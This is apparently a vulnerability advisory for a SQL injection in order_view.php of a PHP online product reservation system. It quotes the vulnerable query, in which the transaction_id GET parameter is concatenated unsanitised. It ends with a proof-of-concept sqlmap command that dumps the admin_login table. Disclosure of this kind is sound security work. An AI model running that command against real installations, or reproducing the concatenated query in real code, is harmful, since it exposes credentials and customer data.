# SQL Injection Vulnerability in order_view.php (Order Viewing)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: order_view.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the order viewing functionality. The application directly concatenates GET parameter into SQL query without validation, allowing attackers to extract order information and sensitive customer data.

### Analyse

**Vulnerability: SQL Injection in SELECT Query**

```php
<table>
<tr>
<th>Name</th>
<th>qty</th>
<th>Price</th>
<th>Model</th>
<th>Amount</th>
</tr>
<?php
// Line 18: User input from GET without validation
$tran = $_GET['transaction_id'];

// Line 19: VULNERABLE! Direct concatenation into SELECT query
$order = mysql_query("SELECT * FROM orders LEFT JOIN products ON orders.prod_id = products.id WHERE orders.trans_query = '$tran'") or die(mysql_error());
WHILE($orders = mysql_fetch_array($order)){
?>
<tr>
<td><?php echo $orders['name']; ?></td>
<td><?php echo $orders['qty']; ?></td>
<td><?php echo $orders['price'];; ?></td>
<td><?php echo $orders['model']; ?></td>
<?php $total = $orders['qty'] * $orders['price']; ?>
<td><?php echo $total; ?></td>

</tr>
<?php
}

?>
</table>
```

**Vulnerability Analysis**:

1. **GET Parameter Injection**: `transaction_id` directly concatenated into SQL query (line 19)
2. **No Input Validation**: User input not validated before use
3. **No Prepared Statements**: Uses deprecated `mysql_query()` function
4. **No Authentication**: File can be accessed without login
5. **Error Disclosure**: MySQL errors directly displayed to user
6. **Data Access**: Allows access to order and product information

### POC

```bash
sqlmap -u "http://localhost:8081/order_view.php?transaction_id=1" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

![1767438211079.png](https://youke3.picui.cn/s1/2026/01/03/6958f74f957db.png)


**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
